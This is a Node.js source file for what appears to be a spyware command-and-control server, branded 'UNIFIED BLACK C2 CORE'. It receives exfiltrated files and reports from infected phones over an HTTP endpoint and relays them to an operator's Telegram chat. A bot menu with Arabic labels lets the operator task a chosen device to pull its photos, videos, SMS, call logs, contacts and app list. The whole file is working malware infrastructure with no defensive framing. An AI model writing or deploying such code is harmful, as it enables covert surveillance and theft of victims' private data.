// server_unified_core.js
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');
const zlib = require('zlib');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const token = process.env.TG_TOKEN;
const chatId = process.env.TG_ID;
const MASTER_SECRET = process.env.AGENT_SECRET || 'BlackActivationMasterKey2026';

if (!token || !chatId) {
    console.error('[-] Critical Error: Telegram credentials missing.');
    process.exit(1);
}

const UPLOAD_DIR = path.join(__dirname, 'unified_storage');
const TEMP_DIR = path.join(__dirname, 'unified_temp');
[UPLOAD_DIR, TEMP_DIR].forEach(dir => { if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); });

const db = new sqlite3.Database('./unified_core.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nonces (nonce TEXT PRIMARY KEY, timestamp INTEGER)`);
    db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
    db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
});

const app = express();
const appBot = new telegramBot(token, { polling: true });

appBot.on('polling_error', (error) => {
    if (error.code !== 'ETELEGRAM' || error.message.indexOf('409 Conflict') === -1) {
        console.log(`[Telegram Polling Warning]: ${error.code} - ${error.message}`);
    }
});

app.use(express.text({ type: '*/*', limit: '500mb' }));

const CRYPTO_KEY = crypto.createHash('sha256').update(Buffer.from(MASTER_SECRET, 'utf8')).digest();
const activeLocks = new Map();

async function sendTg(msg, options = {}) {
    try {
        return await appBot.sendMessage(chatId, msg, { parse_mode: 'HTML', ...options });
    } catch (e) {
        console.error('TG Error:', e.message);
    }
}

app.get('/', (req, res) => {
    res.status(200).send(`<html><body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;"><h1>[⚔] UNIFIED BLACK C2 CORE ONLINE [⚔️]</h1></body></html>`);
});

app.post('/api/v3/unified/stream', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const nodeModel = req.headers['x-node-model'] || 'Unknown';

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);
        
        let payload;
        try {
            const rawBody = req.body;
            // التحقق مما إذا كانت البيانات مبدئية بصيغة JSON مباشرة أو مقفرة بـ base64
            if (rawBody.trim().startsWith('{')) {
                payload = JSON.parse(rawBody);
            } else {
                const packet = JSON.parse(Buffer.from(rawBody, 'base64').toString('utf8'));
                payload = packet;
            }
        } catch (err) {
            return res.status(400).json({ status: 'BAD_PAYLOAD' });
        }

        let directive = { status: 'ACK', task: null };

        if (payload.type === 'TEXT_REPORT') {
            await sendTg(`📋 <b>تقرير من [<code>${nodeId}</code>]:</b>
<pre>${(payload.data || '').substring(0, 3500)}</pre>`);
        } else if (payload.type === 'MEDIA_CHUNK') {
            const { uploadId, fileName, chunkIndex, totalChunks, isLast, data, fileHash } = payload;
            const tempPath = path.join(TEMP_DIR, `${nodeId}_${uploadId}.tmp`);
            
            while (activeLocks.get(uploadId)) await new Promise(r => setTimeout(r, 50));
            activeLocks.set(uploadId, true);
            try {
                fs.appendFileSync(tempPath, Buffer.from(data, 'base64'));
                if (isLast) {
                    const safeName = path.basename(fileName || 'file.bin');
                    const finalPath = path.join(UPLOAD_DIR, `${nodeId}_${Date.now()}_${safeName}`);
                    fs.renameSync(tempPath, finalPath);
                    
                    const fileBuffer = fs.readFileSync(finalPath);
                    const calcHash = crypto.createHash('sha256').update(fileBuffer).digest('hex');
                    if (fileHash && calcHash !== fileHash) {
                        await sendTg(`⚠️ <b>تحذير: تطابق الـ Hash فشل للملف ${safeName}</b>`);
                    } else {
                        await appBot.sendDocument(chatId, finalPath, { caption: `🔥 <b>تم سحب الملف بنجاح!</b>
📱 العقدة: <code>${nodeId}</code>` });
                    }
                }
            } finally {
                activeLocks.delete(uploadId);
            }
        }

        db.get(`SELECT * FROM tasks WHERE node_id = ? AND status = 'PENDING' LIMIT 1`, [nodeId], (err, row) => {
            if (row) {
                directive.task = { id: row.id, action: row.action, payload: JSON.parse(row.payload || '{}') };
                db.run(`UPDATE tasks SET status = 'SENT' WHERE id = ?`, [row.id]);
            }
            res.status(200).json(directive);
        });
    } catch (e) {
        res.status(500).json({ status: 'SERVER_ERROR' });
    }
});

appBot.on('message', async (msg) => {
    if (String(msg.chat.id) !== String(chatId)) return;
    const text = msg.text;

    if (text === '/start') {
        db.all(`SELECT id, model, last_seen FROM nodes`, async (err, rows) => {
            if (!rows || rows.length === 0) {
                await sendTg(`⚠️ <b>لا توجد عقد متصلة حالياً.</b>`);
                return;
            }

            let inlineKeyboard = [];
            rows.forEach(node => {
                inlineKeyboard.push([{ text: `📱 ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
            });

            await sendTg(`🔥 <b>لوحة القيادة والسيطرة الموحدة:</b>
اختر العقدة المستهدفة:`, {
                reply_markup: { inline_keyboard: inlineKeyboard }
            });
        });
    }
});

appBot.on('callback_query', async (query) => {
    const data = query.data;
    const msg = query.message;

    if (data.startsWith('menu_')) {
        const nodeId = data.replace('menu_', '');
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '📸 سحب الصور', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` },
                    { text: '🎥 سحب الفيديوهات', callback_data: `cmd_EXTRACT_VIDEOS_${nodeId}` }
                ],
                [
                    { text: '📨 سحب الرسائل', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
                    { text: '📞 سجل المكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }
                ],
                [
                    { text: '📇 جهات الاتصال', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
                    { text: '📱 التطبيقات', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
                ],
                [{ text: '🔙 عودة', callback_data: 'back_home' }]
            ]
        };
        await appBot.editMessageText(`🎯 <b>العقدة المحددة:</b> <code>${nodeId}</code>`, {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    } else if (data.startsWith('cmd_')) {
        const parts = data.split('_');
        const action = parts[1] + '_' + parts[2];
        const nodeId = parts[3];

        db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [nodeId, action], async () => {
            await appBot.answerCallbackQuery(query.id, { text: `🚀 تم الحقن بنجاح!` });
            await sendTg(`⚡ <b>أمر [<code>${action}</code>] قيد التنفيذ للعقدة <code>${nodeId}</code>...</b>`);
        });
    } else if (data === 'back_home') {
        await appBot.deleteMessage(msg.chat.id, msg.message_id);
        await sendTg(`أرسل <code>/start</code> لإظهار القائمة.`);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[+] Unified Core Online on port ${PORT}`));
